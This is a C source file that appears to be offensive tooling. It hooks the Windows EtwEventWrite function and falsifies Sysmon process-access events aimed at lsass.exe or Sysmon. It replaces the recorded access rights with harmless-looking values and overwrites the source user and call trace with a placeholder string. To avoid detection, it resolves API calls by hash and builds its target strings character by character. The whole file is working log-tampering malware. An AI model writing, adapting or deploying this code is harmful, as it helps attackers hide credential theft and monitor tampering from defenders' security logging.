#include <windows.h>
#include <evntprov.h>

#include "apiresolve.h"
#include "events.h"

VOID HandleProcessAccess(PProcessAccess);

ULONG Hook_EtwEventWrite(REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData) {

	ULONG ret = 0;
	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)GetFunctionPtr(CRYPTED_HASH_NTDLL, CRYPTED_HASH_ETWEVENTWRITEFULL);
	if (EtwEventWriteFull == NULL) 
		goto exit;

	switch (EventDescriptor->Id) {
	case EVENT_PROCESSACCESS:
		HandleProcessAccess((PProcessAccess)UserData);
		break;
	default:
		break;
	}

	ret = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);

exit:

	return ret;

}

VOID HandleProcessAccess(PProcessAccess pProcessAccess) {

	COPYMEMORY _CopyMemory = GetFunctionPtr(H_LIB_KERNEL32, H_API_COPYMEMORY);
	STRSTRW _StrStrW = GetFunctionPtr(H_LIB_SHLWAPI, H_API_STRSTRW);

	PCWSTR plsass = NULL;
	PCWSTR psysmon = NULL;

	ACCESS_MASK access_mask_benign = PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION;
	WCHAR wLsass[] = { L'l',L's',L'a',L's',L's',L'.',L'e',L'x',L'e', 0x00 };
	WCHAR wSysmon[] = { L'S',L'y',L's',L'm',L'o',L'n', 0x00 };
	WCHAR wEnte[] = { L'E',L'n',L't',L'e', 0x00 };

	plsass = _StrStrW(pProcessAccess->ptargetimage, wLsass);
	psysmon = _StrStrW(pProcessAccess->ptargetimage, wSysmon);
	if (plsass || psysmon) {

		*pProcessAccess->pGrantedAccess = access_mask_benign;
		pProcessAccess->sizeGrantedAccess = sizeof(access_mask_benign);

		_CopyMemory(pProcessAccess->pSourceUser, wEnte, sizeof(wEnte));
		pProcessAccess->sizeSourceUser = sizeof(wEnte);

		_CopyMemory(pProcessAccess->pCalltrace, wEnte, sizeof(wEnte));
		pProcessAccess->sizecalltrace = sizeof(wEnte);

	}

	return;
	 
}



